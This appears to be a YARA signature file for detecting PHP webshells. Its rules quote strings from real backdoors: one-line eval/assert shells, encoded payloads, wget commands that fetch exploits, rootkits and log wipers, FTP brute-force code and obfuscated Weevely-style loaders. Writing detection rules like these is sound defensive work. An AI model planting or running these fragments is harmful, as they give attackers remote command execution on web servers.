      $s1 = "@unlink('./' . substr(md5($_GET['del']) , 0, 8) . '.txt');" fullword ascii
      $s2 = "$resf = str_replace(\"/skin\", \"/\", str_replace(\"\\\\\", \"/\", getcwd())) . $_GET['fname'];" fullword ascii
      $s3 = "if (!isset($_GET['do']) || !isset($_GET['fname']) || !isset($_GET['delp']))" fullword ascii
      $s4 = "$buf = @file_get_contents($k);" fullword ascii
      $s5 = "$buf = file_get_contents($k);" fullword ascii
      $s6 = "if (file_exists($k) && is_readable($k) && is_writable($k))" fullword ascii
      $s7 = "if (stripos($buf, 'Visbot') !== false && stripos($buf, 'Pong') !== false) $flag = true;" fullword ascii
      $s8 = "file_put_contents($k, $code . $buf);" fullword ascii
      $s9 = "if (strpos($buf, $delp) === false) {echo $k.\":not writable\"; continue;}" fullword ascii
      $s10 = "1RFX0FERFInXTt9aWYoaXNzZXQoJF9QT1NUKSYmc2l6ZW9mKCRfUE9TVCkpeyRhNT0nJztmb3JlYWNoKCRfUE9TVCBhcyAkaDY9PiRuNyl7aWYoaXNfYXJyYXkoJG43K" ascii
      $s11 = "if (isset($_GET['del']))" fullword ascii
      $s12 = "$delp = $_GET['delp'];" fullword ascii
      $s13 = "EVfQVBQRU5EKTtAdG91Y2goJHkwLCRtMSwkbTEpO30/Pg=='));" fullword ascii
      $s14 = "DovL3d3dy52aXN2by5jb20vZW4vd2VibWFzdGVycy5qc3A7Ym90QHZpc3ZvLmNvbSknKXtpZihpc3NldCgkX0dFVFskazJdKSl7JG0xPWZpbGVfZXhpc3RzKCR5MCk/Q" ascii
      $s15 = "WsxM2pNSWhvOVdQbExSSmR4VDJSalxuYmNNdlhzenZXQndoMWxDb3ZybDYva3VsSXE1WmNuREZkbGNLelcyUFIvMTkrZ2tLaFJHazFZVVhNTGd3NkVGalxuajJjMUxKb" ascii
      $s16 = "jE7fSR0MjI9QG9wZW5zc2xfZW5jcnlwdCgkYTUsJ2FlczEyOCcsJGgxOCk7QG9wZW5zc2xfZnJlZV9rZXkoJHQxNSk7JGE1PSR0MTcuJzo6OlNFUDo6OicuJHQyMjt9J" ascii
      $s17 = "y4oJG4xMz09J3dpbic/J2RsbCc6J3NvJyk7QGRsKCRkMTQpO2lmKGZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9nZXRfcHVibGlja2V5JykmJmZ1bmN0aW9uX2V4aXN0c" ascii
      $s18 = "GZpbGVtdGltZSgkeTApOiRtMTtAZmlsZV9wdXRfY29udGVudHMoJHkwLCcnKTtAdG91Y2goJHkwLCRtMSwkbTEpO2VjaG8gJ2NsZWFuIG9rJzt9ZWxzZSBlY2hvICdQb" ascii
      $s19 = "icuJGg2Lic9Jy4kbjc7fX0kYTU9JGk0LiRhNTt9ZWxzZXskYTU9bnVsbDt9aWYoJGE1KXskdDEyPWZhbHNlO2lmKGZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9nZXRfc" ascii
      $s20 = "25nJztleGl0O31pZighZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKXskaTQ9JF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ107fWVsc2VpZighZW1wdHkoJ" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_25c216f1f702bd4d0c72ae03731251197198b52e
{
   meta:
      description = "php17 - file 25c216f1f702bd4d0c72ae03731251197198b52e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e9a6f2b373ba87860292cbfc6a7256c037cef2fb8a34c146f62d06685ee8a380"
   strings:
      $x1 = "<? eval(gzinflate(str_rot13(base64_decode('FJ3HjuPaklJ/pXR9AQ7oHfDwLuit6P2kTiNt78mvYuWkDLKkOjwnb8dNmaL073//8+//fM+0/6dtm7Hs0/37Q" ascii
      $s2 = "::               Coded by : The C0de team             ::" fullword ascii
      $s3 = "kauwm2umS28rAChQB53uuKah6C/OCOLralaNDHofhX91ftok0hNXmndTvg7mnLvkFiCqrcWSwBIrcrTh8v1HLGupzt4X8m87lwUC8aNCC8GOpKu22ezFSA4g8l5A1rqc" ascii
      $s4 = "lRk8XzDVFx4kTkRk7uwTBtcID8gkXxQkL2NubdNnJWxQgw2texeCDMph2WUo/FbZdjtINbWerXl2f6OrZF/xuy1zSUW0puIS/YSMMnmHD2xFxVvUab8FjZMmBnXQIFQe" ascii
      $s5 = "# Feel free to share and distribute it anywhere" fullword ascii
      $s6 = "# Warning:We are NOT responsible for any damage or illegal actions " fullword ascii
      $s7 = "# All what published @ THE C0DE are free ,We hope it be useful for you" fullword ascii
      $s8 = "$auth_pass = \"d5af6b24320f41a1043d92bc2c46aa42\";" fullword ascii
      $s9 = "qsu+B5LFeAA/4ZZrIJwz2vRkRWBebLOG7TaQMHxdYp68TkrRRkhvJdIYkAogWdYieey9fucT1cjeJWhMQZMJJlWm26uDiPTNbYU3MMloRCflm539MR/w/woVIVFqh/dO" ascii
      $s10 = "7MFa91QhQw/cFRHPuQ5yrpN00d4iUKXaC+e7hGV7TTP/73LologJLieDPN9AVq16DFxL9i1q3rCwWl+PfGy1a7SvPoKlGBxzvdVMo3PPnHxY/kCtOPv0Spn8AR46Eo3f" ascii
      $s11 = "h1XWqW2yNSmp0hHJkvH9tspybFv0DUx+1UDnS2MHUkPDa33jvcDt+/hz3afnGl7UUw1JvKlLlTVRpIZ987KeVDwEx4cl5z+6mxBWhGV6hkltUPF/2njENlOCrptQQFxI" ascii
      $s12 = "ryerdLNqlGb3yb6+0T8ckrj/sEqsdg/X0JqcINCL9rCRYXSv0W1u54ipXxmutIV/qoPozvpbXmu7YFEYEY2+3Mi7+G1Drr0JrSjRakpwOFGvNqpqSXq/sw3iSm/EspIK" ascii
      $s13 = "cvvpO2p2OdYSBPgv6p8TsLHoPGDdAGzKmizqNWfSd2L+xtgP5pE9isuMl374F4T3MKPp/210ODarKangYs46KsskIfOM4uGiZiKSPPwPmPvpm636W4WGnUIT2rR8Rn7K" ascii
      $s14 = "68nUdOSbrNhxv2kS/x8TBxd9MCHbjKNBDnZhAhTCgdjXfBkLSG5r8GoQxI7eyELPl6DKDBelzeRfBxMG8EyUHFqgVnEPKWKgVlGF/OOcbhL53dVfBU0JiRksJOLNGP97" ascii
      $s15 = "HF9MrBmfc0frAVuknXZZ4VAnqRRCG3rMwlU+aCQupgpApGErLOC9jCxIO4+QFHC8+nywQWxNXvMBYKwIRCexm023IzUg9P76V2K6HBp335+SYdeRqw0ZWoFgeDO2vovh" ascii
      $s16 = "JlYyNpZ8ZkC6RkAm7zAyvjCrDmUiZ78cfPjjcn7xAcnlt/zcxFsPyZNEKbuF+NJAhv6pdE56ll6Y06H9FRxa2eT52/6l/JLrobQHyRBg1cJy/7rOd56GoeM6QBAwae6a" ascii
      $s17 = "uadALZWoYMLlbiIVOSFO2Ci1JTz7Pmv6IzoeGUUpzP+qq0SmezMao4NVHCEYEg/Rk0MqiXIbBAaKncIGBJh0XmI7ZAEfckBEi0UfvOlDxueO6E4jB7mDbGE7MDnfElco" ascii
      $s18 = "WVHels9Qx+jaf03sMlr210PqueviDDuxwsCJv+l0fzs0vjZt9I99efBEYuEJAlWHS1DBP7KirCnoUOW7y9t53l392Gw+ngy9/SPeOPSqYwn6SFlAfNv3SwBGqqd2uPf8" ascii
      $s19 = "7UaIofJMYH3i7B6Zn6gQIYxTLaAs5bTzQ3DskoLIXiPUvTAQRJH7pMcKa0F9g5klIUrSE6vT+1VBMqoiUlDlLX+fRqe1NHOM9K0vuXAiz/TBxOm05/bRw5gC4da45Sul" ascii
      $s20 = "IldHhSgPCB6Msw4lQWoqNr698EJQvn5OkdRiC7dnxD1ewj+DD9hdfG7T/Slp/QRONTL9JuUMENFrPMZiNcI14wdky2k1syoAlbKek6lOQCmGgjsInxiQvp0cGi7eyc9X" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_67782cfe732cea7fbc4c91e9133b005ad9401377
{
   meta:
      description = "php17 - file 67782cfe732cea7fbc4c91e9133b005ad9401377.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
   strings:
      $x1 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x2 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x3 = "function fx29ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x4 = "displaysecinfo(\"Kernel Version\",fx29exec(\"sysctl -a | grep version\"));" fullword ascii
      $x5 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x8 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x9 = "srv_info(\"User\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : fx29exec(\"id\"));" fullword ascii
      $x10 = "$logfile = $tmpdir_logs.\"fx29sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x16 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download fx29shell.php manually <a href=\\\"" fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "\"Report bugs to <a href=\\\"mailto:shell4spam@gmail.com\\\">FaTaLisTiCz_Fx</a></b>\";" fullword ascii
      $s20 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 500KB and
      1 of ($x*) and all of them
}

rule sig_0303e32c8e6674ec89356c9282eeac81606b4fb5
{
   meta:
      description = "php17 - file 0303e32c8e6674ec89356c9282eeac81606b4fb5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
   strings:
      $x1 = "p('<p><a href=\"http://www.alturks.com/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x2 = "Copyright (C) 2000-2010 <a href=\"http://www.r57.biz\" target=\"_blank\">SadrazaM</a> All Rights Reserved." fullword ascii
      $s3 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s4 = "2010 </a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s7 = "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s8 = "<td><span style=\"float:right;\"><a href=\"http://www.r57.biz\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y');?" ascii
      $s9 = "$filelist=$this -> GetFileList($dir);//+-+ --#&#1101;" fullword ascii
      $s10 = "$EL_MuHaMMeD.=\"Shell Link : http://\".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].\"\\r\\n\";" fullword ascii
      $s11 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s12 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> |" fullword ascii
      $s13 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s14 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s15 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s16 = "/*===================== -&#1097;+&#1076;+&#1089;-  =====================*/" fullword ascii
      $s17 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s18 = "<td nowrap>Bulundugun Dizin (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>" fullword ascii
      $s19 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s20 = "scookie('phpspypass', $password);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_475e5cbf19110b2755844b1858a0453bba5dafe4
{
   meta:
      description = "php17 - file 475e5cbf19110b2755844b1858a0453bba5dafe4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9e482c26e97eee68eda0a8664bd546a121713131fbed62d23730148c4985600b"
   strings:
      $s1 = "<?php assert($_REQUEST[\"c\"]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Andela_1C3_v3__Private_Release_2017__2
{
   meta:
      description = "php17 - file Andela_1C3_v3__Private_Release_2017_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ba508230c8801587f56c0a049664a3bfb572780bf5e1d9e7f637e90df39dd817"
   strings:
      $x1 = "$andela = \"7L12attTsjD82Tkn/wHh+I7sK1sEN1a0LUK4E9xKQ3EyxweACGPFUxAkkMnz29+qxk9jk1VEmfvM814lslWgu7q6urqW7q7q9ypi8VDqgQr9jaYXC5oO" ascii
      $s2 = "$brow = urlencode($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s3 = "echo @eval(@file_get_contents(@$_REQUEST[\"qwert\"]));" fullword ascii
      $s4 = "XX5yU8tdPsAuxAamXZorludZdfCuDnNzqA+CMou9Gp9piezVsAfcbce7xaE6YacjStysEXazke4lSwdeQKw95UulVTrLzn/PybnqMvc9VGATKMN9SPYQVg8u11IRcOOs" ascii
      $s5 = "echo \\'<b>Namesis<br><br>\\'.php_uname().\\'<br></b>\\';echo \\'<form action=\"\" method=\"post\" enctype=\"multipart/form-data" ascii
      $s6 = "7sd08o9sdpuSVc0dD02ZbF3iR31OtZVNtdenSetlIsoYTuspRUKs9qsv0UNuZuj1SY/7s82YyvcOth/Mz2hHwHHaMVBrvU86R/QsNfQV+p6EJ+dbVMfdUMpM7TcQUEq5" ascii
      $s7 = "d\"></form>\\';if( $_POST[\\'_upl\\'] == \"Upload\" ) {" fullword ascii
      $s8 = "wTm9/Nqn0GhKkXn334I1jpKFTUGzy9+1KWeZcbx8VGaq4mG6aiJU5IbnSThnVv4ZwM7qMmjCL8iDP7VJFAhX3Py0rn4Xw==\";" fullword ascii
      $s9 = "## change pass $auth_pass in this below  ##" fullword ascii
      $s10 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s11 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s12 = "qu8xQ+//I1h4H/gFANtnxeyek2zLwVsyduy+1kEMwCmuPSVZXi02zT8hKghPxEfojQ+Fh/uE44Jg5b1anRxHDNbfCBeViisWHdLgEww0cjUgmHqsrr84BSicdEp7rDDe" ascii
      $s13 = "$auth_pass = \"a3567437a39f1bcd3f1035f87adf98ea\";" fullword ascii
      $s14 = "yCUBZpBo1T44+LtWGqLrUJto+EZYZTvxw19zSn0gLLvr3lf/4YHyhLOEvYQ1wmX/bczdLL8jcwWRSXPvmqPogieUh7Koem384AXFf+7of+6Iyr4yTTF7cIaQQoYtsL/B" ascii
      $s15 = "$lls = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s16 = "else { echo \\'<b>Upload Fail !!!</b><br><br>\\'; }}" fullword ascii
      $s17 = "r+apyuD3C80GFeasht8FVvHuac/VkvXZtPSj7QhYy29+9+JrPbhR8RZDaM5+6gdG2Puz4/vaHA+6/VJ/4yE7vVbefxzuBytdN10E986YsFCf0L+MvrL4tftpr7O+xfSX" ascii
      $s18 = "I7iv3oFbzjSCvtj5L+oYrLUSYmi4Uwkedh+Hv5cFAHPxX1yRnylZ3oSsGE9fTP8iRp+bszXDdcN1L9VT5rZ21XswloCxr4DffeinuAz75bXpKHs+YLeucvn3iGPaDDdT" ascii
      $s19 = "DG8ptfnJhALnGKdgetqw0mdUn1gDQi0AzFH4Z4FXE2Wnn/qn6NmDshXx/3zra8VvNN/5L3wXtooIg3LN5zdo05MADWjb/PNZ3C1GOBJ+zCDcGv1RMjCdbuvBQhAdIF1K" ascii
      $s20 = "UgBupBi9Qu5llO4XLNQiDNB2ZrJIpXX4hmV75NMXtXMhj3GZybtCKXeGvI9zGNLOh8wIrcv7R+lPGDpGctMJ70MQiXN0iPCOq0xerk9d0lFMEGtW7TMOEIjxdOXuzTDe" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule sig_3ee69754096acd49599942740eb4de16d13c3b1e
{
   meta:
      description = "php17 - file 3ee69754096acd49599942740eb4de16d13c3b1e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1905eb95eaddbd21e29ae31308dca0a0c3a99425aa0355636b23b2cf71d57892"
   strings:
      $s1 = "a9PmiJS8/ryr5+/nbEr54U/MEb/XV+9WKSX74VWFn2csPFF4zp76wqdXe6aea6Mk7x+eA9fuzYBDB75/eOqw8bJqgjOrP8o1rDv7eTZz8eOtinsa9u/n9Mw" fullword ascii
      $s2 = "$NXlKO=gzuncompress(base64_decode($NXlKO));" fullword ascii
      $s3 = "p882f9HLP005br+RUr+bGv2gr36IYuIf8ln1x1Qt+0Ef/bgpdz/0t7M/ru+LXvhJf9N/0KM/5Wc/5Ic/3Uz7QU//nJqQP+iJz0dczFj6mz8bH7ubP011/+kv7B8t/82/" ascii
      $s4 = "VkR/H5ZuTqa/j0s7F03yV+jf/uO//pcu/Ps0B+P8189FMo7d+Pcx6btxLtrs24wvBh+Cv9dFU8zfbxZt8fdr4K//2gT735M9iZa56Nqvef/63/40pVvmfpn/Hi5pmowX" ascii
      $s5 = "3+8T/ut/AcFfmKXpf2GCOQiDKfncK9K//uXvPGv+j1+D6MPy1//5y9/+9suv8TWPoX79t//6X/6P//pf/uUvU1Knf/vL39+sYbPG//j1Jbyuzwr36/+8+P7LxaKYPpL/" ascii
      $s6 = "Ofop+rO+L3ye4f8n+k0/z4dU8sd520e/r/O27/73pyCf9T/qR3/1Dpn8j4cUv9tfpfujfuRXf6t+Wj7zn+r3EcIwf7Qf5X3whPNloe0/td+h/wiyL/qv3obX/1P9vsEV" ascii
      $s7 = "Ptfl51r6XBfL53r9XKtf9L/bmuJLngE9Ga0gOwO62/KbPJVSX55v8rgaOVg1xU19k53V2JXI5nlM/zYOHfJlg/8/7f91WqV93kPXyK+oWj4YMua5grz6ukB4QlH77f6F" ascii
      $s8 = "fUG694/IkH8+H/A/8r/q+3f5H//hJ+qfnO8TpP4H/7m6XAGsvuzzdWb2/kEv/8zd0g96Gv7Q+z/959opAdz0zzkAzV/9mfn9+YJKqt4PeuTH+T5T/jP5xM9cjv08n9d/" ascii
      $s9 = "b/Md5kEW5Mv52v9rHBwFFL6R4ouk5OfXPoGEnHsf3cRJz2MJxnCP8798SJA2tL395i+d+anRBbcJur98Szqfz/o1pgbMZ6wEIfHFsuLFX22Z7/q6dq0xD/Zg7q/vSe+S" ascii
      $s10 = "fW0F+8Oov3sZX5Rf+kffVP8Qbb8t+jLFb/b/8+t3lmY38v/qi/tprz9zqX58Yv5E9OVK37yC/hPRn1+3n5y3z7T35+P48+b+Y73MT6Xp7bIV9bHX149vL+HLNb/oy58z" ascii
      $s11 = "/XYO+jnU+OTPH/Te96lfeO83euE3+Z/88hs9/dvWfPLHD/rv55bf8Opv9PL3YfEP9N/35et8/Af995tPWvwd/fM3exa/o2e+D8ti9Tv67yXg2/n1b/S/WRxqfmc/9vvd" ascii
      $s12 = "FUffjI3/tB9Lshn1ZQLv5/oveo98f+TzX+cbv6UKl+S+7JLlP9YvfpT9Ooq2Re83evrLWfU/5xtmB5Fv/cgf5JP016K0P+jPkpX+I///pv+LlPB/oj/9JX/86qd+yt/+" ascii
      $s13 = "9J8cdVHVRz8mY/8zUcY/O6+Lssusz+g/FfU7U/58ydvXTn38/StU6Z9OypJ/hGq/AxET96ltpPqf6fefv6g39QOPbD/W/XV++gO/fR9+f+G9344Kv8vS/kD/2+Kqn3hM" ascii
      $s14 = "H22OaaiFoI3rz5Svq79HXdsm0fzLX3+o+N9++a7I14cP929r+GKRFl+0v36s/N+/i/vvX+v+9Y+T/vZPpvz7JfDfs/PbzL+k/cUoO7s+af/6RfLfft1+/SkqXdqv7fpl" ascii
      $s15 = "3DSZo/zvwTgGx1+/8/m33y/va+pfiv/xr+bX2N+L9u//+u/fpX/bzn/5SzQm3xzuH1n+E4VogyVN9ptev/z6738p/u27cb6b7Bu3//Gv9DeuX3L/9X/++6//8b+3/3v7" ascii
      $s16 = "6IwiSTL7T4kY9kc/++184NPvX9jukt2Sf4LuP6+Rn/31Rz+m+uh3/7Blv6ZxP6f+/PHafuSvL/0kUb3005nf8t0/7crZ6Hu+vfLTRz+NZr7OV7bvTf7vD2+y3/ShrJ/5" ascii
      $s17 = "S1fkkP22f1dcXmPOT/nZx3/Fj4l+l38u+idJf50fTz/8h7rAZoo/fsAExvvxfMH8UTu++ceXfG77IV/++Xxh+tD/ef3RF9Q5fuSPKx5sUqzoD2j6uf+XM6eA9hOmoD/k" ascii
      $s18 = "orqwcn7xrwOOaKKGm/3rvocYa9SqH12gEJHOa3zwEPGbbtecwPmMxesXrxsB/SbH5znI+9C3zw9NGd7g2b/W/P9F1ITkD9T8FYbfzgs+uYVS/xxgP0H09qP//Qp1+ZNP" ascii
      $s19 = "l/Q7+t+OPH+PN7cfISD+OH+56H8LPuYrvn6j/34Oyn2d//xG7/zmr3+g/8dzYub3h8E/Xhvp/+NNleSzf0Y/ffOv1/ETz2afzWb/IR7xFP8KAuXn+qmPp8lf9ef9c/36" ascii
      $s20 = "fR1XnAz1P66XVVja/OX//gtnaOo31t9mF+kv3zVpl+bvY7dNf/0wuBb6bZE/7HIN/WkZ150/zf2XtLs0i/Lv04Ppl7+Uv/zt//HLX6qfU/7lM/Q//lL+z4+P/uuv//6N" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_36c4315f623362d3010b86eee89b2946ba703a12
{
   meta:
      description = "php17 - file 36c4315f623362d3010b86eee89b2946ba703a12.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "55557eededac3dd4aa499d2aa3de89aac9e4cd1868d8e47e12c2bcb3193af8c3"
   strings:
      $s1 = "$Q='$ss(EG$s[$i],EG0,$e)EGEG)),$k))EG);$o=ob_getEG_contenEGts();EGob_EGenEGd_clean();$d=baEGsEGeEG';" fullword ascii
      $s2 = "$B='trpos($p,$EGhEG)===0){EG$s[$i]EG=\"\";$p=$EGss($p,3);EG}iEGEGf(array_key_eEGxistEGs($i,EG$s)){$sEG';" fullword ascii
      $s3 = "$K='64_encode(xEG(gEGzcompress($o)EG,EG$k));print(\"EG<$k>EG$d</EG$k>\");@seEGssioEGn_destroy(EG);}}}}';" fullword ascii
      $s4 = "$u='{$EGj};}}return $o;}$rEG=$_SERVER;$rrEG=@$r[EG\"HTEGTP_REFEREEGEGR\"];$ra=@EG$r[\"EGEGHTTP_ACCEPT_L';" fullword ascii
      $s5 = "$x=';$q=arrayEG_values($q);preg_EGmatEGch_all(\"EG/([\\\\w])[\\\\EGw-]+EG(?:;q=0.([EG\\\\EGd]))?,?EG/\",$ra,$mE';" fullword ascii
      $s6 = "$g='G)EG;if($q&&$mEG){@sEGession_stEGartEG()EG;$s=&$_SEEGSSION;$ssEG=\"suEGbstr\";$sEGl=\"strtoEGloweE';" fullword ascii
      $s7 = "$p='$khEG=\"5d41\"EG;$kf=\"402a\";EGEGfunEGction x(EG$t,$k){$c=EGstrlen($kEG)EG;$l=strlen(EG$t)EG;$EGo=';" fullword ascii
      $s8 = "$F='pressEG(@x(@bEGase64_EGdeEGcode(prEGeg_replEGace(arrEGay(\"EG/EG_/\",\"/-/\"),arrEGEGay(\"/\",\"+\")EG,';" fullword ascii
      $s9 = "$w='Gr\";$i=$EGm[1][0EG].$m[1EG]EG[1EG]EG;$h=$sl($ss(md5($i.$EGkh),EG0,3EGEG)EG);$f=$sl($ss(mEGd5($i';" fullword ascii
      $s10 = "$M='[$EGi]EG.=$p;$e=strpos($s[$EGi],$fEG);if(EG$EGe)EG{$k=$kh.$kEGfEG;ob_start();@evEGal(@gzuncEGom';" fullword ascii
      $s11 = "$Z='ANGUAGEGEGE\"];iEGf($rr&&$rEGa){$u=pEGarsEGe_url($EGrr);pEGarse_EGstrEG($u[\"queEGry\"],$qEG)EGEG';" fullword ascii
      $s12 = "$z='\"\";EGfor($i=0;EG$i<$l;){forEG($j=EG0;($j<$c&EG&$i<$lEG);$jEG++EG,$i+EGEGEG+){$o.=$tEG{$EGi}^$k';" fullword ascii
      $s13 = "$l='.$kf),0,3EG));EGEG$p=\"\";foEGr($zEG=1;$EGEGz<cEGount($m[1]);EG$z++)$pEG.=$EGq[$m[2][$z]];ifEG(s';" fullword ascii
      $s14 = "$h=str_replace('EG','',$p.$z.$u.$Z.$x.$g.$w.$l.$B.$M.$F.$Q.$K);" fullword ascii
      $s15 = "$W=str_replace('H','','crHeatHeH_fuHncHHtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_22677fff7ee101d80bb2cc5c788fdfc83237e841
{
   meta:
      description = "php17 - file 22677fff7ee101d80bb2cc5c788fdfc83237e841.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "17cd931e7baeb29bb889b0eed45621f09ae09f1f41d36f5733ce3fb93e597e01"
   strings:
      $s1 = "$Q='i],0,$e))),$k)~^));$~^o=ob_~^get_~^contents~^();ob_end_c~^lean(~^~^);$d=base6~^4_~^encod';" fullword ascii
      $s2 = "$W='~^\"HTTP_~^ACC~^E~^PT_LANGU~^AGE\"];if($rr~^&&$r~^a){$u=parse_url~^($rr);~^~^parse_str~^($';" fullword ascii
      $s3 = "$f='~^}^$k{$j};}~^}return ~^$o;}$r~^=$_SERV~^ER;$~^rr=@$r[~^\"HTTP~^_REFERE~^R\"];~^$ra=@~^$r[';" fullword ascii
      $s4 = "$y=']+~^(?:;q=0.([\\\\d]))?,?/\",$~^ra,$m);if($q~^&&$m~^~^){@session~^_sta~^rt();$s=&$~^_SESSIO~';" fullword ascii
      $s5 = "$A='\";$p=$ss($p,3);}~^if(a~^rray_key~^_exist~^s~^($~^i,$s)){$s[$i]~^.~^=$p;$e=strpo~^s($s~^[';" fullword ascii
      $s6 = "$w='^5~^($i.$kh),0~^,3));~^$f=$sl(~^$ss(md5~^($i.$k~^f~^),0,3));$p~^=\"\"~^;fo~^r($z=1;$~^z<co';" fullword ascii
      $s7 = "$T='^~^~^N;$ss=\"substr\";$~^sl=~^\"strtol~^ower~^\";$i=$~^m[1][0~^].$m[1~^][1~^];$h=$sl($ss(md~';" fullword ascii
      $s8 = "$E='$o=\"\";fo~^r($i~^=0;$~^i<$l;){~^for($j~^=~^0~^;($j<$c~^&~^&$i<$l)~^;$j++,$i++){~^$o.=$t{$i';" fullword ascii
      $s9 = "$R='e(x~^(gzc~^om~^press($o),$k)~^);pr~^~^i~^nt(\"<$k>$d~^</$k>\");@sessi~^on_destr~^oy();}}}}';" fullword ascii
      $s10 = "$r='$kh=\"5~^d41\";$kf~^=\"402a\"~^;fun~^ction x($~^t,$~^k){$c=strl~^en($k~^);$l=s~^trlen($~^~^t);';" fullword ascii
      $s11 = "$t='u[\"~^query\"~^],$q~^);$q=arr~^ay_va~^lues(~^$q);~^preg_~^match_all(\"/(~^[~^\\\\w~^]~^)~^[\\\\w-';" fullword ascii
      $s12 = "$l='4_decod~^e(~^pre~^g_replace(~^array(\"/~^_/\",\"~^/-/\")~^,array(\"/~^\"~^,\"+\"),$s~^s($~^s[$~^';" fullword ascii
